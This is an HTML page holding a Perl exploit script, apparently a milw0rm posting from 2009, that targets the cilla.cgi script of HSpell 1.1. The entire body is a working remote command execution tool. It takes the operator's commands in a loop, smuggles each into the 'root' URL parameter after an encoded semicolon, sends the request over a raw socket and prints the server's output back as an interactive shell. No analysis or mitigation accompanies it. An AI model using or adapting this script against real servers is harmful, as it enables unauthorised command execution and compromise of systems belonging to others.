<html><head><title>HSPell 1.1 (cilla.cgi) Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl
use IO::Socket;

print q{

HSpell v1.1 Command Execution Exploit

Theres a 1000 ways to improve this exploit,
but I really couldn't be fucked with it.

Made By ZeN
http://dusecurity.com/
http://darkcode.me/

};


$host = 'site.com';
$port = '80';
$path = '/cgi-bin/cilla.cgi';

ShellMe:

print &quot;\nh4x0r~&gt; &quot;;
$cmd = &lt;stdin&gt;;
chop ($cmd);

$cmd =~ s/\ /+/g;


$header = &quot;GET &quot;.$path.&quot;?root=pwnt%3B+&quot;.$cmd.&quot;&amp;binyan=%F7%EC HTTP/1.1\r\n&quot;;
$header = $header.&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$header = $header.&quot;User-Agent: DUSecurity Group\r\n&quot;;
$header = $header.&quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&quot;;
$header = $header.&quot;Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n&quot;;
$header = $header.&quot;Accept-Encoding: gzip,deflate\r\n&quot;;
$header = $header.&quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n&quot;;
$header = $header.&quot;Connection: close\r\n&quot;;
$header = $header.&quot;Cache-Control: max-age=0\r\n&quot;;
$header = $header.&quot;\r\n&quot;;


$get1 = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;$port&quot;) || print &quot;[*] Error!\n&quot;;
print $get1 $header;
$get1-&gt;recv($buffer,50000);

$shell = substr($buffer, 1347);

print $shell;

goto ShellMe;

# milw0rm.com [2009-01-13]</pre></html>